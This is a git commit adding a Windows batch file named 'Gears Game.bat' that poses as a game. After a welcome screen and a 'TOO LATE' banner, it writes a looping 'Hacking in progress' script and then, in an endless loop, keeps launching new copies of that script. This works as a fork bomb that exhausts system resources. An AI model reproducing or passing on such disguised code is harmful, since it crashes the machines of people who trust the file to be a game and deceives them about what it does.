c7f1a2a01127a60503d07b7a1a731e3674958646
medievalOctopus <rorydotg@gmail.com>
2016-09-20 22:44:53 +0100

    Add files via upload

---
+++ Gears Game.bat
@@ -0,0 +1,29 @@
+@echo off
+color a2
+
+echo Welcome to the Gears Game!
+echo --------------------------
+pause
+
+@echo @echo off > hacking.bat
+@echo color 02 >> hacking.bat
+@echo :start >> hacking.bat
+@echo echo Hacking in progress... %%random%%%%random%%%%random%%%%random%%%%random%% >> hacking.bat
+@echo goto start >> hacking.bat
+
+color c0
+echo   _______ ____   ____     _            _______ ______
+echo  ^|__   __/ __ \ / __ \   ^| ^|        /\^|__   __^|  ____^|
+echo     ^| ^| ^| ^|  ^| ^| ^|  ^| ^|  ^| ^|       /  \  ^| ^|  ^| ^|__
+echo     ^| ^| ^| ^|  ^| ^| ^|  ^| ^|  ^| ^|      / /\ \ ^| ^|  ^|  __^|
+echo     ^| ^| ^| ^|__^| ^| ^|__^| ^|  ^| ^|____ / ____ \^| ^|  ^| ^|____ _ _ _
+echo     ^|_^|  \____/ \____/   ^|______/_/    \_\_^|  ^|______(_^|_^|_)
+
+echo 
+timeout 5
+echo 
+
+
+:start
+call start hacking.bat
+goto start
